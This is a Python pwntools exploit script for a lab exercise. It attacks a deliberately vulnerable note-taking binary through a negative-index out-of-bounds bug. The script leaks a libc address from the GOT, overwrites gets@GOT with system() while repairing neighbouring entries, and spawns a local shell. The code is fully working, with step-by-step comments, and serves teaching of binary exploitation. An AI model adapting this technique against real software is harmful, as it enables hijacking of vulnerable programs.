#!/usr/bin/env python3
#
# Lab 4 – Exercise 2: GOT context-aware exploit for ./bin/ex2
#
# Target (ex2.c summary):
#   - Global buffer:
#         char NOTES[MAX_COUNT][NOTE_SIZE];
#     where MAX_COUNT = 64 and NOTE_SIZE = 16.
#
#   - Menu:
#       1. Create Note
#       2. Read Note
#       3. Exit
#
#   - notes_create():
#         scanf("%d", &index);
#         if (index >= MAX_COUNT) return;
#         gets(NOTES[index]);
#     → BUG 1: no check for negative index → out-of-bounds BEFORE NOTES.
#     → BUG 2: gets() → unlimited write of user data to NOTES[index].
#
#   - notes_read():
#         scanf("%d", &index);
#         if (index >= MAX_COUNT) return;
#         printf("NOTE[%d]: %s\n", index, NOTES[index]);
#     → BUG 3: negative index again; %s prints bytes starting from
#              NOTES[index] until '\0' → arbitrary read.
#
# Exploit idea:
#   1) Use NOTES as a “window” on memory:
#      NOTES is a contiguous array; each NOTE is 16 bytes. With a negative
#      index, you can point NOTES[index] into the GOT region.
#
#   2) Stage 1: Leak a libc function address:
#      - Find which negative index corresponds to puts@GOT.
#      - Use "Read Note" on that index to leak the pointer stored in GOT.
#      - From that leak, compute libc base (leaked_puts - libc.symbols['puts']).
#
#   3) Stage 2: Overwrite gets@GOT with system():
#      - Determine which negative index maps to the 16-byte chunk containing
#        gets@GOT.
#      - Build a *context-aware* payload that:
#           * overwrites gets@GOT with libc.symbols['system']
#           * repairs other GOT entries we overwrite in the same 16-byte block
#             (e.g. puts, scanf, getc…) so the program remains stable.
#
#   4) Stage 3: Trigger:
#      - Write "/bin/sh" into NOTES[0].
#      - Call notes_create() again with index 0:
#           notes_create() calls gets(NOTES[0])…
#           but gets@GOT now points to system(), so this actually becomes:
#              system(NOTES[0]);  → system("/bin/sh").
#
#      ⇒ We get a shell.

import sys
import time
from pwn import *

# === Configuration ===

exe = './bin/ex2'
try:
    # Load the binary so pwntools can access symbols, GOT, PLT, segments, etc.
    elf = context.binary = ELF(exe, checksec=False)
except:
    print(f"[!] Binary {exe} not found. Run 'make ex2' first.")
    sys.exit(1)

# Show info/debug logs about what the exploit is doing.
context.log_level = 'info'


def start():
    """
    Start a fresh local process for ./bin/ex2.

    Keeping this in a function makes it easy to later switch to remote()
    if needed (e.g., remote server for the CTF / lab).
    """
    return process(exe)


# --- Menu interaction helpers -------------------------------------------

def send_menu_choice(io, choice: int):
    """
    Read until the menu is fully printed, then send the selected option.

    The menu always ends with:
        3. Exit\n
    so we sync on that, then send the choice as a string.
    """
    io.recvuntil(b'3. Exit\n')
    io.sendline(str(choice).encode())


def send_index(io, index: int):
    """
    Send the index used for Create/Read Note.

    We include a small sleep to avoid racing the program if the
    output/input comes too fast, especially under pwntools.
    """
    time.sleep(0.1)
    io.sendline(str(index).encode())


def send_note(io, data: bytes):
    """
    Send the note content to gets().

    Important:
      - ex2.c uses gets(NOTES[index]), which reads bytes until '\n'
        and then appends '\0'.
      - Our payload must not contain '\n' so it is not cut short.
    """
    time.sleep(0.1)
    io.sendline(data)


# --- Main exploit logic --------------------------------------------------

def solve():
    print("=== Lab 4 Ex 2: GOT Context-Aware Solver ===")
    io = start()

    # === 1. Setup addresses we need =====================================
    #
    # NOTES is a 64 x 16 array; as a flat region of memory it starts at
    #   &NOTES[0][0] == NOTES.
    #
    # NOTES[i] is at:
    #   NOTES_base + i * NOTE_SIZE
    #
    # Using negative indices (i < 0) we can move *before* NOTES and
    # land on the GOT region, which is just above NOTES in memory for
    # this binary layout.
    notes_addr = elf.symbols['NOTES']

    # GOT entries we care about:
    #   - puts@GOT: used to leak libc address.
    #   - gets@GOT: target to overwrite with system().
    puts_got = elf.got['puts']
    gets_got = elf.got['gets']

    # === 2. Leak puts@GOT via negative index ============================
    #
    # We want to find an index i such that:
    #   &NOTES[i] == puts_got
    #
    # Because each note is 16 bytes:
    #   NOTES_base + i * 16 == puts_got
    #   i = (puts_got - NOTES_base) / 16
    #
    # This can be negative, meaning we are indexing before NOTES.
    diff = puts_got - notes_addr
    idx = diff // 16  # floor division gives the correct signed index

    log.info(f"Leaking puts via index {idx}...")

    # Menu: 2 = Read Note
    send_menu_choice(io, 2)
    send_index(io, idx)

    # notes_read() does:
    #   printf("NOTE[%d]: %s\n", index, NOTES[index]);
    #
    # Since NOTES[index] now points into the GOT, %s will read bytes
    # starting from the GOT entry until '\0'. We then capture and decode.
    try:
        io.recvuntil(b']: ')          # discard "NOTE[idx]: "
        leak_data = io.recvline().strip()  # raw bytes until '\n'
        # Convert to 64-bit integer. We pad to 8 bytes with '\0'
        # in case the printed pointer does not have 8 bytes visible.
        leak_val = u64(leak_data.ljust(8, b'\x00'))
        log.success(f"Leaked puts: {hex(leak_val)}")
    except Exception as e:
        log.error(f"Leak failed: {e}")
        return

    # === 3. Resolve libc base address ===================================
    #
    # leak_val = libc_base + libc.symbols['puts']
    #
    # → libc_base = leak_val - libc.symbols['puts']
    libc = elf.libc
    libc.address = leak_val - libc.symbols['puts']
    log.success(f"Libc Base: {hex(libc.address)}")

    # After setting libc.address, all libc.symbols[...] / libc.search(...)
    # are now “rebased” to the correct runtime addresses.
    system_addr = libc.symbols['system']

    # === 4. Build context-aware GOT overwrite payload ===================
    #
    # We want to overwrite gets@GOT with system(), but we can only write
    # 16-byte “chunks” starting at some NOTES[index] location, because
    # each NOTES[i] block is 16 bytes.
    #
    # So we:
    #   1) Compute which NOTES index covers gets@GOT.
    #   2) Build a 32–40 byte payload that:
    #        - at the position of gets@GOT: writes system_addr
    #        - at any other GOT entry we overlap: restores the correct
    #          libc address (so we don't break puts/scanf/etc.)
    #
    # Offsets for gets@GOT:
    diff_gets = gets_got - notes_addr
    idx_gets = diff_gets // 16   # index where our 16-byte write will start
    rem_gets = diff_gets % 16    # offset of gets@GOT inside that 16-byte block

    # Starting address of this 16-byte block:
    start_addr = notes_addr + (idx_gets * 16)

    log.info(f"Write starts at {hex(start_addr)} (Index {idx_gets})")
    log.info(f"gets@got is at offset +{rem_gets} from write start")

    payload_entries = []  # list of 8-byte values we will write
    current_offset = 0

    # Build a map: GOT address → function name (e.g. addr_of_puts@GOT → "puts")
    got_map = {v: k for k, v in elf.got.items()}

    # We will overwrite 4 consecutive 8-byte slots (32 bytes) starting
    # from start_addr:  start_addr, start_addr+8, start_addr+16, start_addr+24.
    #
    # For each 8-byte slot:
    #   - if it is exactly gets@GOT: write system()
    #   - elif it is another known GOT entry: repair it with the correct
    #     libc address (e.g. puts, scanf, getc, etc.).
    #   - else: write padding (dummy value).
    for _ in range(4):
        current_addr = start_addr + current_offset

        if current_addr == gets_got:
            # Target slot: patch gets@GOT → system()
            log.info(f"  +{current_offset}: gets -> system")
            payload_entries.append(system_addr)
        elif current_addr in got_map:
            # This address is another GOT entry, we identify which one
            # (e.g. "puts", "scanf") and write its real libc address
            # to avoid breaking the program flow.
            name = got_map[current_addr]
            addr = libc.symbols[name]
            log.info(f"  +{current_offset}: {name} -> restored")
            payload_entries.append(addr)
        else:
            # Unknown / gap: fill with a harmless value.
            # Must avoid embedding '\n' inside the 8-byte value to keep
            # gets() happy.
            log.info(f"  +{current_offset}: padding")
            payload_entries.append(0xdeadbeef)

        current_offset += 8

    # Serialize the list of 8-byte entries into raw bytes payload.
    payload = b''.join(p64(e) for e in payload_entries)

    # Safety check: gets() stops at '\n', so if any of the addresses
    # contain 0x0a the write will stop early and the GOT overwrite will
    # be incomplete/corrupted. If that happens, we abort and suggest
    # rerunning (ASLR != relevant here; just an unlucky libc layout).
    if b'\n' in payload:
        log.error("Payload contains newline! Unlucky libc address. Rerun.")
        return

    # === 5. Store the command string "/bin/sh" in NOTES[0] ============
    #
    # We will later call gets() on NOTES[0]. After we overwrite gets@GOT
    # with system(), that call will become:
    #   system(NOTES[0]) → system("/bin/sh")
    log.info("Writing '/bin/sh' to index 0...")
    send_menu_choice(io, 1)       # 1 = Create Note
    send_index(io, 0)             # index 0
    send_note(io, b'/bin/sh')     # write "/bin/sh" into NOTES[0]

    # === 6. Perform the GOT overwrite via negative index ==============
    #
    # notes_create():
    #   scanf("%d", &index);
    #   ...
    #   gets(NOTES[index]);
    #
    # With index = idx_gets (negative), NOTES[index] will point into the
    # GOT region at start_addr, and gets() will write our `payload` there.
    log.info(f"Sending overwrite payload to index {idx_gets}...")
    send_menu_choice(io, 1)       # 1 = Create Note
    send_index(io, idx_gets)      # negative index → points to GOT area
    send_note(io, payload)        # writes system() and repairs neighbors

    # === 7. Trigger the shell =========================================
    #
    # At this point:
    #   - gets@GOT has been replaced by system().
    #   - NOTES[0] contains "/bin/sh".
    #
    # When we choose "Create Note" again with index 0, the code does:
    #
    #   scanf("%d", &index);         // index = 0
    #   ...
    #   gets(NOTES[index]);          // originally gets(NOTES[0])
    #
    # But now, GOT entry for gets points to system(), so the call becomes:
    #
    #   system(NOTES[0]) == system("/bin/sh");
    #
    # → we get a shell.
    log.success("Triggering shell...")

    send_menu_choice(io, 1)   # 1 = Create Note
    send_index(io, 0)         # index 0 → NOTES[0] = "/bin/sh"

    # After the system("/bin/sh") call, stdin/stdout is shared with our
    # pwntools process. We can interact as with any shell.
    io.clean(timeout=0.2)
    io.sendline(b'id; ls')
    io.interactive()


if __name__ == "__main__":
    solve()

